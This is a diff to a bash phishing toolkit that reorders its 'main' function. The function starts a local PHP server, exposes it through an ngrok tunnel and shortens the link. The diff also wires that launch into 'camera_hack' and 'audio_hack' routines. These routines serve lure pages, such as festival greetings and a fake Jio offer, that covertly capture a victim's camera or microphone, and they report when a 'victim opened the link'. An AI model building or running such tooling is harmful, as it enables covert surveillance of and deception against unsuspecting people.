@@ -297,14 +297,17 @@ function url_shortner() {
 	printf "$final_url\n"
 }
 
+# MAIN 
+function main() {
+        launch="starting shark server";splashdown="started shark server";printf "\n";connection;php -S 127.0.0.1:4444 > /dev/null 2>&1 & sleep 0.1;ngrok http 4444 > /dev/null 2>&1 & sleep 20 & spinner;link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io");url_shortner;
+}
 
 #CAMERA HACK
- 
 function camera_hack() {	
         clear && printf "\n\n"
         printf "$green >>> ${white}Choose Your Tempelates\n\n"
         printf "$yellow [ 1 ] ${white}Diwali \n\n";printf "$yellow [ 2 ] ${white}Freindship Dare \n\n";printf "$yellow [ 3 ] ${white}Freindship Day \n\n";printf "$yellow [ 4 ] ${white}New Year \n\n";printf "$yellow [ 5 ] ${white}Jio Offfer \n\n"
-        read -p $'$green >>> ${white} Enter Your Choice : \n\n' page
+        read -p $'\e[1;92m >>> \e[0m Enter Your Choice : \n\n' page
         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
         case $page in
 
@@ -330,6 +333,7 @@ function camera_hack() {
 		esac
 		link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                 sed 's+forwarding_link+'$link'+g' ${source} > index2.html;sed 's+forwarding_link+'$link'+g' template.php > index.php
+		main
 		while [ true ]; do			
                         if [[ -e "ip.txt" ]]; then				
 			        printf "\n${green}[${white}+${green}] Victim opened the link!\n\n"
@@ -351,6 +355,7 @@ function audio_hack() {
         printf "${green}[${white}+${green}] Choose a distracting website ${white}(Default: https://youtube.com )" $default_redirect && read redirect_link
         redirect_link="${redirect_link:-${default_redirect}}";link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
         sed 's+forwarding_link+'$link'+g' template.php > index.php;sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
+	main
         while [ true ]; do		
                 if [[ -e "ip.txt" ]]; then			
 		 	printf "\n${green}[${white}+${green}] Victim opened the link!\n\n"
@@ -366,10 +371,6 @@ function audio_hack() {
 
 }
 
-# MAIN 
-function main() {
-        launch="starting shark server";splashdown="started shark server";printf "\n";connection;php -S 127.0.0.1:4444 > /dev/null 2>&1 & sleep 0.1;ngrok http 4444 > /dev/null 2>&1 & sleep 20 & spinner;link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io");url_shortner;
-}
 
 while :
 do
@@ -572,12 +573,12 @@ banner(){
                 break;
 			  
 	elif [ $option = 31 ];then				  
-		cd $phish/Camera_hack && main && file_check
+		cd $phish/Camera_hack && file_check
 		camera_hack
 	        break;
 			   
         elif [ $option = 32 ];then 		
-		cd $phish/Audio_hack && main && file_check
+		cd $phish/Audio_hack && file_check
                 audio_hack
 		break;
 			   
